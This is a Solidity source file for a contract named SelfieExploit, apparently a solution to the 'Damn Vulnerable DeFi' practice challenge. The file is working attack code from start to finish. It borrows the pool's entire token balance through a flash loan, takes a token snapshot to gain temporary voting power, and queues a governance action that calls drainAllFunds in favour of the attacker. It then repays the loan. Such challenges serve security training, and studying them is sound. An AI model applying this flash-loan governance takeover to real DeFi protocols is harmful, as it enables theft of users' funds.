// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieExploit {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;
    uint256 public actionId;
    address attacker;

    constructor(
        address _pool,
        address _governance,
        address _token,
        address _attacker
    ) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
        attacker = _attacker;
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
    }

    function receiveTokens(address _token, uint256 _amount) external {
        token.snapshot();
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            attacker
        );
        actionId = governance.queueAction(address(pool), data, 0);
        IERC20(_token).transfer(address(pool), _amount);
    }
}
